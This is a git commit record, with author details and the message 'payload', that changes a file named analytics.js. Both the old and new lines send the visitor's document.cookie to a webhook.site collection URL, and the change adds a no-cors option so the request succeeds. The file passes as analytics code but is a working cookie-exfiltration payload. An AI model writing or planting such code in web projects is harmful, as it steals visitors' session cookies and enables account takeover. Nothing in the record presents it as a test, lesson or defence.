96f888f226fb9e69dddb51750bd79316f592aa90
Revelate123 <thomasduffett4@gmail.com>
2025-04-25 14:29:09 +1000

    payload

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/cda2c94b-e383-4fc9-9540-05190bd839c2?q="+document.cookie);
+fetch("https://webhook.site/cda2c94b-e383-4fc9-9540-05190bd839c2?q="+document.cookie, {mode: 'no-cors'});
